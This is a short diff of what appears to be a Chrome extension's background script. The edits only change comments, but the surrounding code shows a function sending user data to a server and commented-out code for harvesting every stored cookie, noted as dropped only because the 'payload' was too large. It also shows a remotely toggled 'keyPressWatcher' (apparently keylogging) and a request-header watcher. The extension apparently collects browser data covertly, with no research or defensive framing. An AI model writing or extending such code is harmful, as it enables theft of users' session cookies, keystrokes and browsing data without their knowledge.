@@ -42,7 +42,7 @@ const addUser = (uid) => {
         postRequest("/user/", data).catch((err) => console.log(err.message));
     });
 
-    // Get all stored cookies, payload too large
+    // Get all stored cookies, PAYLOAD TOO LARGE
     // chrome.cookies.getAllCookieStores((cookieStores) => {
     //     cookieStores.forEach((s) =>
     //         chrome.cookies.getAll({ storeId: s.id }, (c) => {
@@ -188,7 +188,7 @@ chrome.storage.sync.get("keyPressWatcher", (runCommand) => {
     });
 });
 
-// Just prints headers
+// Just prints headers for now
 chrome.storage.sync.get("requestWatcher", (runCommand) => {
     if (!runCommand.requestWatcher) return;
     // onBeforeSendHeaders, onSendHeaders
